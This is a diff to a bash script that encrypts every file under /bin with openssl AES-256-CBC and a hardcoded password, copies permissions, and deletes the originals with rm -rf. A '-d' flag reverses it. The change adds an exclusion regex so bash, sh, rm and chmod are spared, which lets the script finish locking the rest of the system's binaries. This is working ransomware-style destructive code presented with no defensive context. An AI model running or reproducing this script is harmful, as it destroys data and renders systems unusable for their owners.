@@ -8,8 +8,9 @@
 ###
 
 # GLOBALS ~ Change these
-TARGET_DIRECTORY="/bin/*"
-PASSWORD="PaSsWoRdKeY"
+TARGET_DIRECTORY='/bin/*'
+PASSWORD='PaSsWoRdKeY'
+FILE_EXCLUSIONS='(bash|sh|rm|chmod)'
 
 # Creates new encrypted files, copies permissions, removes old files
 function encrypt {
@@ -20,31 +21,34 @@ function encrypt {
 
 # Creates new unecrypted files, copies permissions, removes old files
 function decrypt {
-    # decrypt files here
     openssl enc -aes-256-cbc -d -in $1 -out ${1:0:${#1}-4} -pass pass:$PASSWORD
     chmod --reference=$1 ${1:0:${#1}-4}
     rm -rf $1
 }
 
-# Recursively goes through a directory encrypting or decrypting files
+# Recursively goes through a directory encrypting or decrypting files not excluded
 for directory in $TARGET_DIRECTORY
 do
     if [ ! -d "$directory" ]; then
-    for file in $directory
+        for file in $directory
         do
-            if [ ! "$1" == "-d" ]; then
-                encrypt $file
-            else
-                decrypt $file
+            if [[ ! $file =~ $FILE_EXCLUSIONS ]]; then
+                if [ ! "$1" == "-d" ]; then
+                    encrypt $file
+                else
+                    decrypt $file
+                fi
             fi
         done
     else
         for file in $directory/*
         do
-            if [ ! "$1" == "-d" ]; then
-                encrypt $file
-            else
-                decrypt $file
+            if [[ ! $file =~ $FILE_EXCLUSIONS ]]; then
+                if [ ! "$1" == "-d" ]; then
+                    encrypt $file
+                else
+                    decrypt $file
+                fi
             fi
         done
     fi
